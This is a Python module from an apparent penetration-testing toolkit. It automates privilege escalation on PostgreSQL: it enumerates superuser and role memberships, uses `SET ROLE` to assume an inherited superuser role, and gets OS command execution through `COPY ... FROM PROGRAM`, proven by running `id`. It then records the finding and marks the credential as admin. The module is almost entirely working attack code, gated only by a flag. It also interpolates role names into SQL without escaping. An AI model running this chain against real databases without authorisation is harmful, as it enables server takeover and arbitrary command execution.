"""PostgreSQL low-priv → OS command execution (COPY FROM PROGRAM).

The database analog of :mod:`fieldkit.mssql` for a Postgres foothold. Two ways to a
proven shell:

* **Direct** — the current login is a superuser (or a member of the
  ``pg_execute_server_program`` role, PG 11+). ``COPY … FROM PROGRAM`` runs an OS
  command as the postgres server process; we run ``id`` and record the output.
* **Escalate via role membership** — the login is a member (direct or transitive) of a
  role that holds ``SUPERUSER``. ``SET ROLE <role>`` assumes that identity inside the
  session, then the direct path applies. This is the exact analog of MSSQL's
  ``EXECUTE AS`` → ``sp_addsrvrolemember`` chain.

Everything read-only under ``read-only``; ``allow_config_change`` is only asked when
we're going to execute a command on the target. On a win we record a proven finding,
attach the captured step, upgrade the credential's ``postgres`` access to admin, and
add reversible cleanup notes (drop the temp table, RESET ROLE).

Testing: nothing here spawns a child — the ``psql`` invocation goes through the
injected runner (``run=`` for tests).
"""
import re
from dataclasses import dataclass, field

from .creds import Credential, render_psql

# Read-only enumeration. Every result carries an ``FK:`` sentinel so a chatty psql
# banner (or an operator-set PSQLRC) does not confuse the parse.
_WHOAMI = "SELECT 'FK:' || current_user"
_IS_SUPER = ("SELECT 'FK:' || CASE WHEN rolsuper THEN '1' ELSE '0' END "
             "FROM pg_roles WHERE rolname = current_user")
# Direct + transitive role memberships (WITH RECURSIVE) — the MSSQL IMPERSONATE analog.
_MEMBERSHIPS = (
    "WITH RECURSIVE mine(role) AS ("
    "  SELECT r.rolname FROM pg_roles r JOIN pg_auth_members m ON m.roleid = r.oid "
    "  JOIN pg_roles me ON me.oid = m.member WHERE me.rolname = current_user "
    "UNION "
    "  SELECT r.rolname FROM pg_roles r JOIN pg_auth_members m ON m.roleid = r.oid "
    "  JOIN pg_roles mem ON mem.oid = m.member JOIN mine ON mine.role = mem.rolname) "
    "SELECT 'FK:' || role FROM mine")
# Which of those roles is superuser? (parameterized in _role_is_super).
_ROLE_SUPER = ("SELECT 'FK:' || CASE WHEN rolsuper THEN '1' ELSE '0' END "
               "FROM pg_roles WHERE rolname = {r}")
_HAS_EXEC_ROLE = (
    "SELECT 'FK:' || CASE WHEN EXISTS ("
    "  WITH RECURSIVE mine(role) AS ("
    "    SELECT r.rolname FROM pg_roles r JOIN pg_auth_members m ON m.roleid=r.oid "
    "    JOIN pg_roles me ON me.oid=m.member WHERE me.rolname=current_user "
    "  UNION "
    "    SELECT r.rolname FROM pg_roles r JOIN pg_auth_members m ON m.roleid=r.oid "
    "    JOIN pg_roles mem ON mem.oid=m.member JOIN mine ON mine.role=mem.rolname"
    "  ) SELECT 1 FROM mine WHERE role='pg_execute_server_program'"
    ") THEN '1' ELSE '0' END")
_LIST_DB = ("SELECT 'FK:' || datname FROM pg_database WHERE datallowconn "
            "AND NOT datistemplate ORDER BY datname")

# COPY FROM PROGRAM proof — creates a temp table, runs `id`, reads it back with a
# sentinel. Temp tables live in the session, so cleanup is implicit. The double-quoted
# identifier avoids collision with a real ``fk`` table.
_EXEC_TEST = (
    'CREATE TEMP TABLE "fk_exec" (o text); '
    "COPY \"fk_exec\" FROM PROGRAM 'id'; "
    "SELECT 'FK:' || string_agg(o, E'\\n') FROM \"fk_exec\"")


def _fk(output):
    """Every ``FK:<value>`` the driven query relayed, stripped."""
    return [m.strip() for m in re.findall(r"FK:(.*)", output or "")]


def _query_argv(cred, ip, sql, *, port=None, database=None):
    return render_psql(cred, ip, port=port, database=database, sql=sql)


@dataclass
class PostgresReport:
    host: str
    port: int = 5432
    database: str = "postgres"
    status: str = "none"   # exec | escalated | already_superuser | gated | none | failed | aborted
    is_superuser: bool = False
    escalatable_via: list = field(default_factory=list)   # role names that grant superuser
    exec_role_member: bool = False
    databases: list = field(default_factory=list)
    aborted: str = None
    via: str = None
    error: str = None


def escalate_privs(store, host, cred, *, run=None, allow_config_change=False,
                   port=5432, database="postgres", on_event=None):
    """Get from a Postgres login to OS command execution.

    Read-only just enumerates — superuser?, memberships that grant superuser, whether
    ``pg_execute_server_program`` covers me, and the DB inventory. With
    ``allow_config_change`` we run the direct ``COPY FROM PROGRAM`` test; if I'm not
    yet superuser, we ``SET ROLE`` to a member superuser first and retry. On success:
    proven finding, captured step, admin access upgrade, cleanup notes.
    """
    from . import runner as runner_mod
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env))
    cred = cred if isinstance(cred, Credential) else Credential.from_row(cred)
    ip = host["ip"]
    rep = PostgresReport(host=ip, port=port, database=database)

    def query(sql):
        rendered = _query_argv(cred, ip, sql, port=port, database=database)
        return run(rendered.argv, rendered.env)

    def emit(m):
        if on_event:
            on_event(m)

    # read-only surface (always safe)
    who = query(_WHOAMI)
    if who.error:
        rep.aborted = who.error
        return rep
    me = next(iter(_fk(who.output)), None) or cred.username
    rep.is_superuser = "1" in _fk(query(_IS_SUPER).output)
    rep.exec_role_member = "1" in _fk(query(_HAS_EXEC_ROLE).output)
    rep.databases = _fk(query(_LIST_DB).output)

    if not rep.is_superuser:
        for role in _fk(query(_MEMBERSHIPS).output):
            is_super = "1" in _fk(query(_ROLE_SUPER.format(
                r=f"'{role}'")).output)
            if is_super:
                rep.escalatable_via.append(role)
                emit(f"  member of superuser role: {role}")

    emit(f"  connected as {me} on {ip}:{port}/{database} "
         f"(superuser={rep.is_superuser}, exec_role_member={rep.exec_role_member}, "
         f"escalatable_via={rep.escalatable_via or 'none'})")

    if not allow_config_change:
        rep.status = ("already_superuser" if rep.is_superuser else
                      "gated" if (rep.escalatable_via or rep.exec_role_member) else
                      "none")
        return rep

    # 1) direct — already superuser or member of pg_execute_server_program
    if rep.is_superuser or rep.exec_role_member:
        emit("  testing COPY FROM PROGRAM (echo id)…")
        out = query(_EXEC_TEST).output or ""
        if _fk(out):
            rep.status = "exec"
            _establish_exec(
                store, host, cred, ip, port=port, database=database,
                proof=_fk(out)[0],
                report_type="postgres_copy_from_program",
                title=("PostgreSQL COPY FROM PROGRAM → OS command execution "
                       f"({'superuser' if rep.is_superuser else 'pg_execute_server_program'})"),
                evidence=(f"{me} on {ip}:{port} can run `COPY … FROM PROGRAM` "
                          "(verified `id`) — OS command execution as the postgres "
                          "server process."))
            return rep
        rep.status = "failed"
        return rep

    # 2) SET ROLE to a member superuser → retry the direct path
    if rep.escalatable_via:
        role = rep.escalatable_via[0]
        emit(f"  escalating: SET ROLE {role} → COPY FROM PROGRAM")
        out = query(f"SET ROLE \"{role}\"; " + _EXEC_TEST).output or ""
        if _fk(out):
            rep.status = "escalated"
            rep.via = role
            _establish_exec(
                store, host, cred, ip, port=port, database=database,
                proof=_fk(out)[0],
                report_type="postgres_role_grant",
                title=(f"PostgreSQL SET ROLE {role} → superuser → "
                       "COPY FROM PROGRAM"),
                evidence=(f"{me} is a member of superuser role {role} on {ip}:{port}; "
                          "`SET ROLE` assumes that identity, and `COPY … FROM PROGRAM` "
                          "then runs OS commands as the postgres server process."),
                extra_cleanups=[
                    (f"session assumed role {role} on {ip}",
                     "no persistent change — `SET ROLE` scope ends with the session")])
            return rep
        rep.status = "failed"
        return rep

    rep.status = "none"
    return rep


def _establish_exec(store, host, cred, ip, *, port, database, proof, report_type,
                    title, evidence, extra_cleanups=()):
    """Record the proven OS-exec finding, upgrade the postgres access to admin, and
    record a reversible cleanup."""
    with store.transaction():
        fid, _ = store.add_finding(report_type, title, host_id=host["id"],
                                   proven=True, evidence=evidence)
        store.add_step(cmd=f"psql -h {ip} -p {port} -d {database} -c \"{_EXEC_TEST}\"",
                       output=(proof or "").strip(), host_id=host["id"],
                       finding_id=fid, transport="psql")
        store.add_access(host["id"], store.credential_id(cred), "postgres", admin=True)
        for desc, cmd in extra_cleanups:
            store.add_artifact(desc, cleanup_cmd=cmd, host_id=host["id"], finding_id=fid)
